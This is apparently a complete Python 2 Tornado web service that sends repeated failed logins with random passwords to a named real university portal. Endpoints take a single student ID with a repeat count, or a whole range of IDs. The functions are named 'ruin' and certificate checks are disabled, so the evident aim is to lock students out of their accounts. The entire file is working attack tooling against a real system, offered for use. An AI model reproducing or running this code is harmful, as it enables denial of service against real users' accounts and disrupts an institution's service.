import random
import string
import urllib
import urlparse
from tornado.web import Application, RequestHandler, MissingArgumentError
from tornado.httpclient import AsyncHTTPClient, HTTPRequest

client = AsyncHTTPClient()
loginUrl = 'https://myportal.sutd.edu.sg/psp/EPPRD/?cmd=login&languageCd=ENG'

def ruin(id, password):
	def onResponse(response):
		userid = urlparse.parse_qs(response.request.body)['userid'][0]
		print('Done - %s' % (userid))

	form = {
		"timezoneOffset": -480,
		"userid": id,
		"pwd": password
	}
	request = HTTPRequest(loginUrl, method='POST', body=urllib.urlencode(form), validate_cert=False, user_agent='Tornado')
	client.fetch(request, onResponse)

class IndexHandler(RequestHandler):
    def get(self):
        self.write('Ruining...')
        self.finish()

class SingleHandler(RequestHandler):
	def get(self):
		try:
			id = int(self.get_argument('id'))
			times = int(self.get_argument('times'))

			for i in range(times):
				ruin(id, ''.join(random.sample(string.ascii_letters + string.digits, 16)))

			self.write('Ruining %s for %s times.' % (id, times))

		except MissingArgumentError as e:
			self.set_status(403)
			self.write('MissingArgumentError')

		except ValueError as e:
			self.set_status(403)
			self.write('ValueError')

		finally:
			self.finish()

class BatchHandler(RequestHandler):
	def get(self):
		try:
			start = int(self.get_argument('start'))
			stop = int(self.get_argument('stop'))

			for id in range(start, stop):
				ruin(id, ''.join(random.sample(string.ascii_letters + string.digits, 16)))

			self.write('Ruining from %s to %s' % (start, stop))

		except MissingArgumentError as e:
			self.set_status(403)
			self.write('MissingArgumentError')

		except ValueError as e:
			self.set_status(403)
			self.write('ValueError')

		finally:
			self.finish()

application = Application([
    (r"/", IndexHandler),
    (r"/single", SingleHandler),
    (r"/batch", BatchHandler),
])
